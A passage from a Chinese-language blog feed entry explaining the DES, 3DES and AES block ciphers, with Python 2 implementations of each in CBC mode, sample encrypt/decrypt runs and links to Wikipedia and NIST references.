bn[pos] = (v &amp; 8) &gt;&gt; 3            bn[pos + 1] = (v &amp; 4) &gt;&gt; 2            bn[pos + 2] = (v &amp; 2) &gt;&gt; 1            bn[pos + 3] = v &amp; 1            pos += 4            j += 1        # 与P盒进行置换        rblock = permute(P, bn)        rblock = list(map(lambda x, y: x ^ y, rblock, lblock))        lblock = rtemp        i += 1        iteration += iteration_adjustment    final = permute(IP_, rblock + lblock)    return finaldef cipher(data, key, iv, choice):    if len(data) % BLOCK_SIZE != 0:        raise ValueError(&quot;Data length illegal.&quot;)    if len(key) != 8 or len(iv) != 8:        raise ValueError(&quot;key/iv\&#39;s length should be 8.&quot;)    create_sub_keys(key)    iv = convert_string_to_bitlist(iv)    i = 0    result = []    while i &lt; len(data):        block = convert_string_to_bitlist(data[i:i + 8])        if choice == ENCRYPT:            block = list(map(lambda x, y: x ^ y, block, iv))            block = des_cipher(block, choice)            iv = block        elif choice == DECRYPT:            temp = block[:]            block = des_cipher(block, choice)            block = list(map(lambda x, y: x ^ y, block, iv))            iv = temp        result.append(convert_bitlist_to_string(block))        i += 8    return &#39;&#39;.join(result)if __name__ == &#39;__main__&#39;:    key = &#39;#qianfei&#39;    iv = &#39;0&#39; * 8    data = &#39;#qianfei11111111&#39;    ciphertext = cipher(data, key, iv, ENCRYPT)    # print [ord(c) for c in ciphertext]    print ciphertext    plaintext = cipher(ciphertext, key, iv, DECRYPT)    # print [ord(c) for c in plaintext]    print plaintext</code></pre><h1 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h1><p>密码学中，三重数据加密算法（英语：Triple Data Encryption Algorithm，缩写为 TDEA，Triple DEA），或称 3DES（Triple DES），是一种对称密钥加密块密码，相当于是对每个数据块应用三次数据加密标准（DES）算法。由于计算机运算能力的增强，原版 DES 密码的密钥长度变得容易被暴力破解；3DES 即是设计用来提供一种相对简单的方法，即通过增加 DES 的密钥长度来避免类似的攻击，而不是设计一种全新的块密码算法。</p><h2 id="算法流程-1"><a href="#算法流程-1" class="headerlink" title="算法流程"></a>算法流程</h2><p>三重 DES 的本质上就是经过了三次 DES 操作，密钥长度为 24 字节，拆分为三个长为 8 字节的密钥，加密时依次对明文进行加密、解密、加密的操作，解密时相反。具体如下：</p><p>$$<br>Ciphertext = E_{K3}(D_{K2}(E_{K1}(Plaintext))) \<br>Plaintext = D_{K1}(E_{K2}(D_{K3}(Ciphertext)))<br>$$</p><h2 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h2><pre><code class="python">...def triple_encipher(data, masterKey, iv):    if len(masterKey) == 8:        key1 = masterKey[:8]        key2 = masterKey[:8]        key3 = masterKey[:8]    elif len(masterKey) == 16:        key1 = masterKey[:8]        key2 = masterKey[8:16]        key3 = masterKey[:8]    else:        key1 = masterKey[:8]        key2 = masterKey[8:16]        key3 = masterKey[16:24]    keys = [key1, key2, key3]    # print keys    i = 0    result = []    while i &lt; len(data):        block = cipher(data[i:i + 8], keys[0], iv, ENCRYPT)        block = cipher(block, keys[1], iv, DECRYPT)        block = cipher(block, keys[2], iv, ENCRYPT)        iv = block        result.append(block)        i += 8    return &#39;&#39;.join(result).encode(&#39;base64&#39;)def triple_decipher(data, masterKey, iv):    if len(masterKey) == 8:        key1 = masterKey[:8]        key2 = masterKey[:8]        key3 = masterKey[:8]    elif len(masterKey) == 16:        key1 = masterKey[:8]        key2 = masterKey[8:16]        key3 = masterKey[:8]    else:        key1 = masterKey[:8]        key2 = masterKey[8:16]        key3 = masterKey[16:24]    keys = [key1, key2, key3]    # print keys    i = 0    result = []    data = data.decode(&#39;base64&#39;)    while i &lt; len(data):        temp = data[i:i + 8]        block = cipher(data[i:i + 8], keys[2], iv, DECRYPT)        block = cipher(block, keys[1], iv, ENCRYPT)        block = cipher(block, keys[0], iv, DECRYPT)        iv = temp        result.append(block)        i += 8    return &#39;&#39;.join(result)if __name__ == &#39;__main__&#39;:    key = &#39;#qianfei&#39;    iv = &#39;0&#39; * 8    data = &#39;#qianfei11111111&#39;    ciphertext = triple_encipher(data, key, iv)    # print [ord(c) for c in ciphertext]    print ciphertext    plaintext = triple_decipher(ciphertext, key, iv)    # print [ord(c) for c in plaintext]    print plaintext</code></pre><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>高级加密标准（英语：Advanced Encryption Standard，缩写：AES），在密码学中又称 Rijndael 加密法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的 DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于 2001 年 11 月 26 日发布于 FIPS PUB 197，并在 2002 年 5 月 26 日成为有效的标准。2006 年，高级加密标准已然成为对称密钥加密中最流行的算法之一。</p><h2 id="算法流程-2"><a href="#算法流程-2" class="headerlink" title="算法流程"></a>算法流程</h2><p>严格地说，AES 和 Rijndael 加密法并不完全一样（虽然在实际应用中两者可以互换），因为 Rijndael 加密法可以支持更大范围的区块和密钥长度：AES 的区块长度固定为 128 比特，密钥长度则可以是 128，192 或 256 比特；而 Rijndael 使用的密钥和区块长度均可以是 128，192 或 256 比特。加密过程中使用的密钥是由 Rijndael 密钥生成方案产生。</p><table><thead><tr><th style="text-align:center">AES</th><th style="text-align:center">密钥长度（32 位比特字)</th><th style="text-align:center">分组长度(32 位比特字)</th><th style="text-align:center">加密轮数</th></tr></thead><tbody><tr><td style="text-align:center">AES-128</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">AES-192</td><td style="text-align:center">6</td><td style="text-align:center">4</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">AES-256</td><td style="text-align:center">8</td><td style="text-align:center">4</td><td style="text-align:center">14</td></tr></tbody></table><p>大多数 AES 计算是在一个特别的有限域完成的。AES 加密过程是在一个 4×4 的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个 Byte）。（Rijndael 加密法因支持更大的区块，其矩阵的“列数（Row number）”可视情况增加）加密时，各轮 AES 加密循环（除最后一轮外）均包含 4 个步骤：</p><ul><li>轮密钥加：矩阵中的每一个字节都与该次回合密钥做 XOR 运算；每个子密钥由密钥生成方案产生。</li><li>字节代换：透过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。</li><li>行位移：将矩阵中的每个横列进行循环式移位。</li><li>列混合：为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略 MixColumns 步骤，而以另一个轮密钥取代。</li></ul><h3 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h3><p>轮密钥加中，密钥将会与原矩阵合并。在每次的加密循环中，都会由主密钥产生一把回合密钥（透过 Rijndael 密钥生成方案产生），这把密钥大小会跟原矩阵一样，以与原矩阵中每个对应的字节作异或（⊕）加法。</p><p><img src="/pics/Python实现DES、AES加密解密算法/4.png" srcset="/img/loading.gif" alt></p><h3 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h3><p>在字节代换步骤中，矩阵中的各字节透过一个 8 位的 S-box 进行转换。这个步骤提供了加密法非线性的变换能力。S-box 与 $GF(2^{8})$ 上的乘法反元素有关，已知具有良好的非线性特性。为了避免简单代数性质的攻击，S-box 结合了乘法反元素及一个可逆的仿射变换矩阵建构而成。此外在建构 S-box 时，刻意避开了固定点与反固定点，即以 S-box 替换字节的结果会相当于错排的结果。</p><p><img src="/pics/Python实现DES、AES加密解密算法/5.png" srcset="/img/loading.gif" alt></p><h3 id="ShiftRows"><a href="#ShiftRows" class="headerlink" title="ShiftRows"></a>ShiftRows</h3><p>行位移描述矩阵的列操作。在此步骤中，每一列都向左循环位移某个偏移量。在 AES 中（区块大小 128 位），第一列维持不变，第二列里的每个字节都向左循环移动一格。同理，第三列及第四列向左循环位移的偏移量就分别是 2 和 3。128 位和 192 比特的区块在此步骤的循环位移的模式相同。经过行位移之后，矩阵中每一竖行，都是由输入矩阵中的每个不同行中的元素组成。Rijndael 算法的版本中，偏移量和 AES 有少许不同；对于长度 256 比特的区块，第一列仍然维持不变，第二列、第三列、第四列的偏移量分别是 1 字节、2 字节、3 字节。除此之外，行位移操作步骤在 Rijndael 和 AES 中完全相同。</p><p><img src="/pics/Python实现DES、AES加密解密算法/6.png" srcset="/img/loading.gif" alt></p><h3 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h3><p>在列混合步骤，每一行的四个字节透过线性变换互相结合。每一行的四个元素分别当作$1, x, x^2, x^3$ 的系数，合并即为 $GF(2^{8})$ 中的一个多项式，接着将此多项式和一个固定的多项式 $c(x)=3x^{3}+x^{2}+x+2$ 在模 $x^4+1$ 下相乘。此步骤亦可视为 Rijndael 有限域之下的矩阵乘法。列混合函数接受 4 个字节的输入，输出 4 个字节，每一个输入的字节都会对输出的四个字节造成影响。因此行位移和列混合两步骤为这个密码系统提供了扩散性。</p><p><img src="/pics/Python实现DES、AES加密解密算法/7.png" srcset="/img/loading.gif" alt></p><h2 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h2><p>这里实现了采用 CBC 模式且密钥长度为 128 位的 AES 算法：</p><pre><code class="python">#!/usr/bin/env python# -*- encoding=utf-8 -*-ENCRYPT = 0DECRYPT = 1BLOCK_SIZE = 16S = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,     0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]S_ = [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,      0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d]Rcon = [    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,    0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,    0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,    0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,]round_keys = [[0] * 4] * 44def xtime(a):    return (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def convert_string_to_matrix(string):    matrix = []    for i in range(16):        byte = ord(string[i])        if i % 4 == 0:            matrix.append([byte])        else:            matrix[i / 4].append(byte)    return matrixdef convert_matrix_to_string(matrix):    string = &#39;&#39;    for i in range(4):        for j in range(4):            string += chr(matrix[i][j])    return stringdef generate_round_keys(master_key):    round_keys[:4] = convert_string_to_matrix(master_key)    # print round_keys    for i in range(4, 4 * 11):        temp = []        if i % 4 == 0:            # print round_keys[i - 4][0]            # print round_keys[i - 1][0]            # print Rcon[i/4]            byte = round_keys[i - 4][0] ^ S[round_keys[i - 1][1]] ^ Rcon[i / 4]            # print i, byte            temp.append(byte)            for j in range(1, 4):                byte = round_keys[i - 4][j] ^ S[round_keys[i - 1][(j + 1) % 4]]                # print byte                temp.append(byte)        else:            for j in range(4):                byte = round_keys[i - 4][j] ^ round_keys[i - 1][j]                temp.append(byte)        round_keys[i] = temp    # print round_keysdef add_round_key(matrix, round_key):    for i in range(4):        for j in range(4):            matrix[i][j] ^= round_key[i][j]    return matrixdef sub_bytes(matrix, table):    for i in range(4):        for j in range(4):            matrix[i][j] = table[matrix[i][j]]    return matrixdef shift_single_row(matrix, line, n):    i = 0    while i &lt; n:        temp = matrix[0][line]        for j in range(3):            matrix[j][line] = matrix[j + 1][line]        matrix[3][line] = temp        i += 1    return matrixdef shift_rows(matrix, inversed=False):    if inversed == True:        matrix = shift_single_row(matrix, 1, 3)        matrix = shift_single_row(matrix, 2, 2)        matrix = shift_single_row(matrix, 3, 1)    else:        matrix = shift_single_row(matrix, 1, 1)        matrix = shift_single_row(matrix, 2, 2)        matrix = shift_single_row(matrix, 3, 3)    return matrixdef mix_single_column(matrix):    t = 0    for i in range(4):        t ^= matrix[i]    # print &#39;x =&gt;&#39;, t    temp = matrix[0]    for i in range(3):        matrix[i] ^= t ^ xtime(matrix[i] ^ matrix[i + 1])    matrix[3] ^= t ^ xtime(matrix[3] ^ temp)    return matrixdef mix_columns(matrix, inversed=False):    if inversed == True:        for i in range(4):            u = xtime(xtime(matrix[i][0] ^ matrix[i][2]))            v = xtime(xtime(matrix[i][1] ^ matrix[i][3]))            matrix[i][0] ^= u            matrix[i][1] ^= v            matrix[i][2] ^= u            matrix[i][3] ^= v        matrix = mix_columns(matrix)    else:        for i in range(4):            # print &#39;m =&gt;&#39;, matrix[i]            matrix[i] = mix_single_column(matrix[i])    return matrixdef aes_cipher(block, rounds, choice):    if len(block) != 16:        raise ValueError(&quot;Block\&#39;s length must be 16.&quot;)    matrix = convert_string_to_matrix(block)    if choice == ENCRYPT:        matrix = add_round_key(matrix, round_keys[:4])        i = 1        while i &lt; rounds:            matrix = sub_bytes(matrix, S)            matrix = shift_rows(matrix)            matrix = mix_columns(matrix)            matrix = add_round_key(matrix, round_keys[4 * i:4 * i + 4])            i += 1        matrix = sub_bytes(matrix, S)        matrix = shift_rows(matrix)        matrix = add_round_key(matrix, round_keys[40:])    elif choice == DECRYPT:        matrix = add_round_key(matrix, round_keys[40:])        matrix = shift_rows(matrix, inversed=True)        matrix = sub_bytes(matrix, S_)        i = rounds - 1        while i &gt; 0:            matrix = add_round_key(matrix, round_keys[4 * i:4 * i + 4])            matrix = mix_columns(matrix, inversed=True)            matrix = shift_rows(matrix, inversed=True)            matrix = sub_bytes(matrix, S_)            i -= 1        matrix = add_round_key(matrix, round_keys[:4])    return convert_matrix_to_string(matrix)def cipher(data, key, iv, rounds, choice):    if len(data) % BLOCK_SIZE != 0:        raise ValueError(&quot;Data length illegal.&quot;)    if len(key) != 16 or len(iv) != 16:        raise ValueError(&quot;key/iv\&#39;s length should be 16.&quot;)    generate_round_keys(key)    i = 0    result = []    while i &lt; len(data):        block = data[i:i + 16]        if choice == ENCRYPT:            block = list(map(lambda x, y: ord(x) ^ ord(y), block, iv))            block = &#39;&#39;.join([chr(c) for c in block])            block = aes_cipher(block, rounds, choice)            iv = block        elif choice == DECRYPT:            temp = block[:]            block = aes_cipher(block, rounds, choice)            block = list(map(lambda x, y: ord(x) ^ ord(y), block, iv))            block = &#39;&#39;.join([chr(c) for c in block])            iv = temp        result.append(block)        i += BLOCK_SIZE    return &#39;&#39;.join(result)if __name__ == &#39;__main__&#39;:    key = &#39;#qianfei12345678&#39;    iv = &#39;0&#39; * 16    ciphertext = cipher(&#39;#qianfei12345678&#39;, key, iv, 10, ENCRYPT)    print ciphertext    plaintext = cipher(ciphertext, key, iv, 10, DECRYPT)    print plaintext</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/Data_Encryption_Standard" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Data_Encryption_Standard</a><br><a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Advanced_Encryption_Standard</a><br><a href="https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf" target="_blank" rel="noopener">https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf</a><br><a href="https://blog.csdn.net/Apollon_krj/article/details/76124722" target="_blank" rel="noopener">https://blog.csdn.net/Apollon_krj/article/details/76124722</a><br><a href="https://github.com/twhiteman/pyDes/blob/master/pyDes.py" target="_blank" rel="noopener">https://github.com/twhiteman/pyDes/blob/master/pyDes.py</a><br><a href="https://en.wikipedia.org/wiki/Triple_DES" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Triple_DES</a><br><a href="http://blog.niuhemoon.xyz/pages/2018/05/18/Python-Symmetric-encryption/" target="_blank" rel="noopener">http://blog.niuhemoon.xyz/pages/2018/05/18/Python-Symmetric-encryption/</a><br><a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf" target="_blank" rel="noopener">https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf</a><br><a href="https://www.cxyxiaowu.com/3239.html" target="_blank" rel="noopener">https://www.cxyxiaowu.com/3239.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过实现 DES 和 AES 深入了解对称加密（实现均采用 CBC 模式）。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="blog.b3ale.cn/tags/crypto/"/>
    
      <category term="python" scheme="blog.b3ale.cn/tags/python/"/>
    
  </entry>
  
</feed>
